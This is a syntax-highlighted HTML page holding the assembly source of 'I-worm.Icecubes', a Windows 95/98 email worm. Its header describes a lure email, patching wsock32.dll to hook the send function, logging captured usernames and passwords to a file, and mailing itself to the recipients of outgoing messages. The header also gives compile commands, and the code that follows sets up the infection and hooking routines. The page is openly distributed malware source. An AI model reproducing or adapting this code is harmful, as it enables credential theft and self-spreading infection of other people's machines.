<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Email-Worm.Win32.Icecubes.b - icecubes.asm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;****************************************************************************;</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">;                    I-worm.Icecubes v 1.05</span><span class="sc0">
</span><span class="sc1">;               written by f0re </span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">;============================================================================;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; ABOUT</span><span class="sc0">
</span><span class="sc1">; -----</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Welcome to the sourcecode of my first i-worm. I have given this worm its</span><span class="sc0">
</span><span class="sc1">; name, i-worm.Icecubes, because of two reasons. First of all, here where</span><span class="sc0">
</span><span class="sc1">; i live the summer is coming..and i like icecubes in my drinks :).</span><span class="sc0">
</span><span class="sc1">; Secondly it is because of the joke behind the worm host code; when a user </span><span class="sc0">
</span><span class="sc1">; receives the worm in his mailbox, the emailmessage looks like this:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Subject: Fw: Windows Icecubes ! </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; ----- Original Message -----</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; &gt;Look at what I found on the web. This tool scans your system for hidden</span><span class="sc0">
</span><span class="sc1">; &gt;Windows settings.</span><span class="sc0">
</span><span class="sc1">; &gt;These settings, which are better known as the "Windows Icecubes", were</span><span class="sc0">
</span><span class="sc1">; &gt;built in Windows by</span><span class="sc0">
</span><span class="sc1">; &gt;the programmers at Microsoft and were supposed to be kept secret. </span><span class="sc0">
</span><span class="sc1">; &gt;</span><span class="sc0">
</span><span class="sc1">; &gt;Just take a look, cause I think you might want to make some changes ;).</span><span class="sc0">
</span><span class="sc1">; &gt;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; EXECUTION</span><span class="sc0">
</span><span class="sc1">; ---------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; When the worm is executed it will first check whether it is being executed</span><span class="sc0">
</span><span class="sc1">; under win 95/98. If any other version of windows is found, it will skip the</span><span class="sc0">
</span><span class="sc1">; infection procedure and run the worm-host code immediately. </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; If windows 95/98 is detected it will try to locate the wsock32.dll and copy it</span><span class="sc0">
</span><span class="sc1">; to wsock32.inf. It also copies itself to the windows system directory under </span><span class="sc0">
</span><span class="sc1">; the name wsock2.dll. Then it will add the worm code to the .inf file by</span><span class="sc0">
</span><span class="sc1">; increasing the size of the last section.</span><span class="sc0">
</span><span class="sc1">; Next the worm will point the send api address in the wsock32.inf export table</span><span class="sc0">
</span><span class="sc1">; to the virus code. Finally the worm drops a wininit.ini file in the windir</span><span class="sc0">
</span><span class="sc1">; to direct windows at the next reboot to overwrite the original wsock32.dll</span><span class="sc0">
</span><span class="sc1">; with the infected wsock32.inf.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Then the worm will execute the worm host code; a progressbar followed by</span><span class="sc0">
</span><span class="sc1">; funny dialog (check it out for yourself :).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; SEND HOOK</span><span class="sc0">
</span><span class="sc1">; ---------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Once the wsock32.dll api-hook-routine receives control it will scan the send</span><span class="sc0">
</span><span class="sc1">; buffer for usernames and or passwords. If these are found, they are stored in the</span><span class="sc0">
</span><span class="sc1">; file &lt;windir&gt;\icecube.txt. If an email is being sended, the worm will extract the</span><span class="sc0">
</span><span class="sc1">; recipient(s) emailaddress(es), the from emailaddres, the recipient(s) name(s)</span><span class="sc0">
</span><span class="sc1">; and the from-name. Next it will base64 encode the host-worm file (wsock2.dll) and</span><span class="sc0">
</span><span class="sc1">; prepare a new email with the encoded host attached. The body of the email contains</span><span class="sc0">
</span><span class="sc1">; the text as shown in the ABOUT section of this description. This new email will</span><span class="sc0">
</span><span class="sc1">; be send after the original email has been send (this is also known as the</span><span class="sc0">
</span><span class="sc1">; happy99 technique).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; THANKS</span><span class="sc0">
</span><span class="sc1">; ------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; I'd like to thank the following persons who helped me with my many</span><span class="sc0">
</span><span class="sc1">; questions: BlackJack, MrSandman, Spo0ky, Darkman, Benny, Prizzy,</span><span class="sc0">
</span><span class="sc1">; urgo32, Lifewire, dageshi and T-2000.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;****************************************************************************;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; To compile: </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       tasm32 icecubes.asm /ml /m</span><span class="sc0">
</span><span class="sc1">;       tlink32 -aa icecubes.obj import32.lib</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       brcc32 icecubes.rc</span><span class="sc0">
</span><span class="sc1">;       brc32.exe icecubes.res </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;****************************************************************************;</span><span class="sc0">

</span><span class="sc2">.386</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">stdcall</span><span class="sc0">

</span><span class="sc5">locals</span><span class="sc0">
</span><span class="sc5">jumps</span><span class="sc0">
    </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">DialogBoxParamA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetModuleHandleA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">EndDialog</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetWindowRect</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetDesktopWindow</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">MoveWindow</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">CreateThread</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">SendDlgItemMessageA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">SetDlgItemTextA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetDlgItemTextA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetModuleHandleA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetVersion</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">

</span><span class="sc9">.data</span><span class="sc0">

    </span><span class="sc5">Start</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">

    </span><span class="sc5">CheckWindowsVersion</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetVersion</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ReturnToWormHost</span><span class="sc0">

    </span><span class="sc5">MainRoutines</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GET_GETPROCADDRESS_API_ADDRESS</span><span class="sc0">     
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GET_WINDIR</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GET_SYSDIR</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">INFECT_WSOCK</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">COPY_HOST_FILE</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">

    </span><span class="sc5">ReturnToWormHost</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">OriginalHost</span><span class="sc0">

</span><span class="sc1">;==============================[ includes ]==================================;</span><span class="sc0">

    </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">windows.inc</span><span class="sc0">
    </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">wsocks.inc</span><span class="sc0">
    </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">myinc.inc</span><span class="sc0">

</span><span class="sc1">;=============================[ ic-data.inc ]===============================;</span><span class="sc0">

</span><span class="sc1">; get_gpa.inc data</span><span class="sc0">
    </span><span class="sc5">kernel32address</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0BFF70000h</span><span class="sc0">
    </span><span class="sc5">numberofnames</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">addressoffunctions</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">addressofnames</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">addressofordinals</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">AONindex</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">AGetProcAddress</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetProcAddress"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">  
    </span><span class="sc5">AGetProcAddressA</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">            

</span><span class="sc1">; directory.inc data</span><span class="sc0">
    </span><span class="sc5">currentdir</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">sysdir</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">windir</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">AGetSystemDirectory</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetSystemDirectoryA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">AGetWindowsDirectory</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetWindowsDirectoryA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">ASetCurrentDirectory</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"SetCurrentDirectoryA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">; infect_wsock.inc</span><span class="sc0">
    </span><span class="sc5">wsock32dll</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Wsock32.dll"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">wsock32inf</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Wsock32.inf"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">ACopyFile</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"CopyFileA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">        
    </span><span class="sc5">infectionflag</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">AFindFirstFile</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"FindFirstFileA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">myfinddata</span><span class="sc0">          </span><span class="sc5">WIN32_FIND_DATA</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
    </span><span class="sc5">filesize</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc10">memory</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">ADeleteFile</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"DeleteFileA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">; infect_file.inc</span><span class="sc0">
    </span><span class="sc5">ASetFileAttributes</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"SetFileAttributesA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">ACreateFile</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"CreateFileA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">ACreateFileMapping</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"CreateFileMappingA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">AMapViewOfFile</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"MapViewOfFile"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">    
    </span><span class="sc5">filehandle</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">    
    </span><span class="sc5">maphandle</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">mapaddress</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">    
    </span><span class="sc5">PEheader</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">imagebase</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">imagesize</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">wnewapiaddress</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">AUnmapViewOfFile</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"UnmapViewOfFile"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">ACloseHandle</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"CloseHandle"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">ASetFilePointer</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"SetFilePointer"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">ASetEndOfFile</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"SetEndOfFile"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">ASetFileTime</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"SetFileTime"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">; hook_api.inc</span><span class="sc0">
    </span><span class="sc5">woldapiaddress</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">; rva_to_raw.inc</span><span class="sc0">
    </span><span class="sc5">rva2raw</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">    

</span><span class="sc1">; get_api.inc</span><span class="sc0">
    </span><span class="sc5">user32address</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">wsock32address</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">    

</span><span class="sc1">; create_ini_file.inc</span><span class="sc0">
    </span><span class="sc5">inifile</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"wininit.ini"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">writtensize</span><span class="sc0">             </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">inicrlf</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">rename</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"[rename]"</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0"> 
    </span><span class="sc5">slashsign</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc13">"\",0
</span><span class="sc0">    </span><span class="sc5">equalsign</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"="</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">writtenbytes</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">AWriteFile</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"WriteFile"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">; ws_copy_host_file</span><span class="sc0">
    </span><span class="sc5">AGetModuleFileName</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetModuleFileNameA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">; get_bases.inc</span><span class="sc0">
    </span><span class="sc5">ALoadLibrary</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"LoadLibraryA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">k32</span><span class="sc0">                 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"KERNEL32.dll"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">user32</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"USER32.dll"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">wsock32</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"WSOCK32.dll"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">; host_code.inc</span><span class="sc0">
    </span><span class="sc5">dlgrect</span><span class="sc0">             </span><span class="sc5">RECT</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
    </span><span class="sc5">desktoprect</span><span class="sc0">             </span><span class="sc5">RECT</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0"> 
    </span><span class="sc5">dlgwidth</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">dlgheight</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">threadid</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">initflag</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">okflag</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">flag</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">pastvalue</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">currentvalue</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'2'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">doneflag</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">value11</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Days"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">value12</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Weeks"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">value13</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Months"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">value14</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Years"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">value3</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"5000"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">value4</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"17"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">; ic.asm</span><span class="sc0">
    </span><span class="sc5">hInst</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">; write_to_file.inc</span><span class="sc0">
    </span><span class="sc5">passwordfile</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"icecube.txt"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">; ws_intercept.inc</span><span class="sc0">
    </span><span class="sc5">socketh</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">status</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">AGlobalAlloc</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GlobalAlloc"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">fromaddress</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">fromsize</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">rcptnumber</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">rcpt_buffer_address</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">rcpt_size_address</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">totalrcptsize</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">fromtag</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'From:'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">totag</span><span class="sc0">               </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'To:'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">mimeendtag</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'&gt;'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">mimefrom_address</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">mimefromsize</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">fromstatus</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">tostatus</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">toendtag</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Subject:'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">mimetosize</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">mimeto_address</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">; ws_b64_encoder.inc</span><span class="sc0">
    </span><span class="sc5">encTable</span><span class="sc0">                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuv'</span><span class="sc0">
                            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'wxyz0123456789+/'</span><span class="sc0">
</span><span class="sc1">; ws_attachment</span><span class="sc0">
    </span><span class="sc5">wsock2</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Wsock2.dll"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">   
    </span><span class="sc5">smHnd</span><span class="sc0">                   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                
    </span><span class="sc5">dmHnd</span><span class="sc0">                   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">    
    </span><span class="sc5">bytesread</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">    
    </span><span class="sc5">encodedsize</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">    
    </span><span class="sc5">AReadFile</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"ReadFile"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
